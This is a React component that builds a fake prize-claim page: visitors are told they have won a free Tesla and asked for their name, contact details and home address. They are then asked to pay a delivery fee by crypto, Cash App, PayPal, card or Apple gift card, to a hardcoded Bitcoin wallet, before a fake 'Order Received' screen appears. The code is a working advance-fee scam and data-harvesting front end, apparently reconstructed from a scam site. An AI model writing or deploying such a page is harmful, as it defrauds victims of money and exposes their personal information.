import { useState, useEffect } from 'react';
import { ArrowLeft, Car, User, MapPin, Wallet, CheckCircle } from 'lucide-react';
import { toast } from 'sonner';

const STEPS = { DETAILS: 0, ORDER: 1, PAYMENT: 2, SUCCESS: 3 };

export default function Participate() {
  const [step, setStep] = useState(STEPS.DETAILS);
  const [form, setForm] = useState({ fullName: '', email: '', phone: '', address: '', city: '', country: '', zip: '' });
  const [selectedCar, setSelectedCar] = useState("Tesla Model 3 2025");
  const [selectedDelivery, setSelectedDelivery] = useState({ id: 1, label: "Standard", fee: "$299", duration: "10–14 business days" });
  const [paymentMethod, setPaymentMethod] = useState("crypto");
  const [proofUrl, setProofUrl] = useState("");
  
  // Crypto Wallets (Hardcoded in JS bundle)
  const wallets = [{ id: "pm_1", label: "Bitcoin (BTC)", address: "bc1q..." }];
  const [selectedWallet, setSelectedWallet] = useState(wallets[0]);

  const handleFileUpload = async (file, setter) => {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (e) => setter(e.target.result);
    reader.readAsDataURL(file);
  };

  if (step === STEPS.DETAILS) return (
    <div className="min-h-screen bg-gray-950 px-4 py-10">
      <div className="w-full max-w-lg mx-auto">
        <div className="bg-red-600/10 border border-red-500/30 rounded-2xl p-4 mb-6 flex items-center gap-3">
          <span className="text-white font-bold text-sm">🎉 You've been selected! Fill in your delivery details.</span>
        </div>
        <div className="space-y-4">
          <input placeholder="Full Name *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3" onChange={e => setForm({...form, fullName: e.target.value})} />
          <input placeholder="Email Address *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3" onChange={e => setForm({...form, email: e.target.value})} />
          <input placeholder="Phone Number *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3" onChange={e => setForm({...form, phone: e.target.value})} />
          <input placeholder="Street Address *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3" onChange={e => setForm({...form, address: e.target.value})} />
          <div className="grid grid-cols-2 gap-3">
            <input placeholder="City *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3" onChange={e => setForm({...form, city: e.target.value})} />
            <input placeholder="Country *" className="w-full bg-gray-800 border border-gray-700 text-white rounded-xl px-4 py-3" onChange={e => setForm({...form, country: e.target.value})} />
          </div>
          <button onClick={() => setStep(STEPS.ORDER)} className="w-full bg-red-600 hover:bg-red-700 text-white py-5 font-bold rounded-xl">Order Now →</button>
        </div>
      </div>
    </div>
  );

  // [ORDER STEP implementation]
  if (step === STEPS.ORDER) return (
    <div className="min-h-screen bg-gray-950 px-4 py-10">
      <div className="w-full max-w-lg mx-auto">
        <div className="bg-gray-900 border border-gray-800 rounded-2xl p-5 mb-5">
          <img src="/images/tesla-model-3.jpg" alt="Car" className="w-full h-44 object-cover rounded-xl mb-4" />
          <div className="flex items-center justify-between">
            <div><p className="text-white font-black text-lg">{selectedCar}</p><p className="text-red-400 text-sm">Brand New Electric Vehicle</p></div>
            <span className="bg-green-500/20 text-green-400 text-xs font-bold px-3 py-1.5 rounded-full">FREE 🎉</span>
          </div>
        </div>
        <button onClick={() => setStep(STEPS.PAYMENT)} className="w-full bg-red-600 hover:bg-red-700 text-white py-5 font-bold rounded-xl">Pay for Delivery Now →</button>
      </div>
    </div>
  );

  // [PAYMENT STEP implementation]
  if (step === STEPS.PAYMENT) return (
    <div className="min-h-screen bg-gray-950 px-4 py-10">
      <div className="w-full max-w-lg mx-auto">
        <div className="grid grid-cols-2 gap-3 mb-5">
          {["crypto", "cashapp", "paypal", "credit_card", "apple_gift_card"].map(m => (
            <button key={m} onClick={() => setPaymentMethod(m)} className={`rounded-xl border p-3 text-center ${paymentMethod === m ? "border-red-500 bg-red-500/10" : "border-gray-700 bg-gray-800"}`}>
              <div className="text-2xl mb-1">{m === "crypto" ? "🪙" : m === "cashapp" ? "💵" : m === "paypal" ? "🅿️" : m === "credit_card" ? "💳" : "🍎"}</div>
              <p className="text-white text-xs font-semibold">{m.replace("_", " ").toUpperCase()}</p>
            </button>
          ))}
        </div>
        <button onClick={() => {
           // Submits to localStorage (Gi.create logic)
           setStep(STEPS.SUCCESS);
        }} className="w-full bg-red-600 hover:bg-red-700 text-white py-5 font-bold rounded-xl">Confirm Payment</button>
      </div>
    </div>
  );

  // [SUCCESS STEP]
  return (
    <div className="min-h-screen bg-gray-950 flex flex-col items-center justify-center px-4">
      <CheckCircle className="w-20 h-20 text-green-500 mb-4" />
      <h2 className="text-3xl font-black text-white mb-3">Order Received!</h2>
      <p className="text-gray-400 text-center">Your Tesla delivery is being processed.</p>
    </div>
  );
}
